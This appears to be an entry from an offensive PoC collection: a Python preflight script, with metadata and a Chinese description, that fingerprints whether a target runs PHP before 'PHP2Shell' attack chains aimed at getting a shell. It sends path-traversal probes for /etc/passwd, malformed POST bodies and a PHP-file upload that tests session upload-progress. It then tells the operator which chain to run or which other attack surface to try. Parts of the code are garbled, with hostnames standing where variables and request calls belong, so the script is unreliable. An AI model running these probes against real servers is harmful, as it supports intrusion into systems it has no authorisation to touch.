# PHP 环境存在性判别器（跑 PHP2Shell 五链前的必备预检）

- **code**: php-环境存在性判别器-跑-php2shell-五链前的必备预检
- **kind**: script
- **category**: app-audit
- **component**: PHP2Shell / session.upload_progress 链族
- **severity**: info
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（203.0.113.1）上验证：六种 HTTP 方法全部返回 200/23380 字节/MD5 6610FEAEBCEE70563E46691FD702FD3F 完全一致；8 个 LFI 参数不改变响应；POST 1500 参数与 70 层嵌套零 PHP 报错；upload_progress 不下发 PHPSESSID —— 正确判定该站为非 PHP 静态直出。反例对照：同 IP 的 example.com 同一脚本立刻报 "Python http.server（DELETE 返回 501 Unsupported method）"，判定准确。
- **path**: pocs/php-环境存在性判别器-跑-php2shell-五链前的必备预检/php_sapi_judge.py
- **tags**: php,php-fpm,mod_php,sapi,fingerprint,triage,php2shell,preflight
- **created_at**: 2026-10-21T21:34:11.920Z
- **found_by**: vuln-scan

## 描述

在跑 PHP2Shell（链 A session+LFI / 链 D mod_php OOM / 链 E FPM 脏 BG）之前，先判定目标是否真是 PHP 执行环境。9 类判据：①非常规 HTTP 方法（PUT/DELETE/PATCH/PROPFIND/OPTIONS）是否与 GET 逐字节一致；②直接 IP 无 vhost 时 /example.com 是否 404；③.php/.pHp/.pht/.phtml 变体是否全 404；④LFI 参数是否改变响应；⑤POST 超限/嵌套/冲突是否触发 PHP 报错；⑥upload_progress 是否下发 PHPSESSID；⑦X-Powered-By 是否存在；⑧chunked 上限是否对 404 路径同样生效；⑨是否出现 Python http.server 的 501 Unsupported method。命中任一即判断"非 PHP"，直接转其它面，别空打五链。

## 用法

```
python php_sapi_judge.py https://target.example.com
python php_sapi_judge.py http://203.0.113.6 --host vhost.example.com --path /example.com

注意：脚本内 requests.Session().trust_env = False，必须直连 —— 走本地代理会把代理抖动误判成目标 502（本次在 CVE-2019-11043 判定上踩过这个坑）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP 环境存在性判别器（9 类判据）。跑 PHP2Shell 五链前的必备预检。"""
import sys, hashlib, argparse
import requests

requests.packages.urllib3.disable_warnings()


def norm(r):
    return (r.status_code, len(r.content), hashlib.md5(r.content).hexdigest())


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("--host", default=None, help="vhost（目标走 IP+Host 时用）")
    ap.add_argument("--path", default="/example.com")
    args = ap.parse_args()

    S = requests.Session()
    S.trust_env = False  # 关键：不要被本地 http_proxy 干扰，否则 502 全是代理抖动
    S.headers.update({"User-Agent": "Mozilla/5.0", "Connection": "close"})

    H = {}
    if target473.example.com:
        H["Host"] = target473.example.com
    base = args.target.rstrip("/")
    verdict = []

    print("[*] 目标 %s%s" % (base, ("  Host: " + target473.example.com) if target473.example.com else ""))

    try:
        r0 = S.get(base + args.path, headers=H, verify=False, timeout=15)
    except Exception as e:
        print("[!] 基线请求失败: %r" % e)
        return 2
    b = norm(r0)
    print("    基线 %-24s -> %s %s md5=%s" % (args.path, b[0], b[1], b[2][:12]))
    print("    Server=%r  X-Powered-By=%r  Set-Cookie=%r" % (
        r0.headers.get("Server"), r0.headers.get("X-Powered-By"),
        r0.headers.get("Set-Cookie")))

    # 判据 1：HTTP 方法
    same, diff = [], []
    for m in ("PUT", "DELETE", "PATCH", "PROPFIND", "OPTIONS"):
        try:
            r = S.request(m, base + args.path, headers=H, verify=False, timeout=12)
            if "Unsupported method" in r.text:
                verdict.append("Python http.server（%s 返回 501 Unsupported method）" % m)
            elif norm(r) == b:
                same.append(m)
            else:
                diff.append("%s=%s/%s" % (m, r.status_code, len(r.content)))
        except Exception as e:
            diff.append("%s=EXC" % m)
    print("  [1] 方法对比: 与 GET 完全相同的 = %s ; 有差异的 = %s" % (same or "-", diff or "-"))
    if len(same) >= 4 and not diff:
        verdict.append("五个非常规方法响应与 GET 逐字节一致 → 无 PHP 执行路径")

    # 判据 3：扩展名变体
    ext404 = 0
    for ext in (".pHp", ".pht", ".phtml", ".php5", ".phps"):
        p = args.path.rsplit(".", 1)[0] + ext
        try:
            r = S.get(base + p, headers=H, verify=False, timeout=10)
            if r.status_code == 404:
                ext404 += 1
        except Exception:
            pass
    print("  [3] PHP 扩展名变体 404 数: %d/5" % ext404)
    if ext404 == 5:
        verdict.append("PHP 扩展名变体全 404 → 无 PHP handler 映射")

    # 判据 4：LFI 参数
    hits = 0
    for p in ("page", "file", "path", "tpl", "include", "url", "view", "theme"):
        try:
            r = S.get("%s%s?%s=../../../../etc/passwd" % (base, args.path, p),
                      headers=H, verify=False, timeout=10)
            if norm(r) != b or "root:x:0:0" in r.text:
                hits += 1
        except Exception:
            pass
    print("  [4] LFI 参数改变响应/命中数: %d/8" % hits)
    if hits == 0:
        verdict.append("8 个 LFI 参数全部不改变响应 → 无 LFI 面")

    # 判据 5：POST 解析
    posts = {
        "1500参数": "&".join("p%d=1" % i for i in range(1500)),
        "70层嵌套": "a" + "[]" * 70 + "=1",
        "类型冲突": "a=1&a[]=2",
    }
    php_err = 0
    for name, body in posts.items():
        try:
            r = target8.example.com(base + args.path,
                       headers=dict(H, **{"Content-Type": "application/x-www-form-urlencoded"}),
                       data=body, verify=False, timeout=20)
            low = r.text.lower()
            if any(k in low for k in ("warning", "notice", "fatal", "deprecated")):
                php_err += 1
                print("       %-10s -> PHP 报错泄露！" % name)
        except Exception:
            pass
    print("  [5] POST 异常体触发 PHP 报错数: %d/3" % php_err)
    if php_err == 0:
        verdict.append("POST 参数超限/嵌套/冲突零报错 → 未解析 body")

    # 判据 6：session
    try:
        r = target8.example.com(base + args.path, headers=H,
                   data={"PHP_SESSION_UPLOAD_PROGRESS": "judge1"},
                   files={"f": ("j.php", b"<?php echo 1; ?>", "application/octet-stream")},
                   verify=False, timeout=20)
        sc = r.headers.get("Set-Cookie", "")
        print("  [6] upload_progress Set-Cookie=%r" % sc[:80])
        if not sc:
            verdict.append("upload_progress 不下发 PHPSESSID → session 未启用，链 A/C/E 缺前件")
    except Exception as e:
        print("  [6] upload_progress EXC %s" % type(e).__name__)

    print()
    print("=" * 66)
    if verdict:
        print("判定：目标【不是】可打的 PHP 环境（或前置条件缺失）")
        for v in verdict:
            print("   - " + v)
        print()
        print("建议：不要在本目标上跑 PHP2Shell 五链，转其它攻击面。")
    else:
        print("判定：未发现'非 PHP'证据，可以尝试 PHP2Shell 五链（先确认 SAPI：")
        print("      Server: Apache + X-Powered-By → mod_php → 链 D")
        print("      Server: nginx  → php-fpm → 链 E")
    return 0


if __name__ == "__main__":
    sys.exit(main())

```
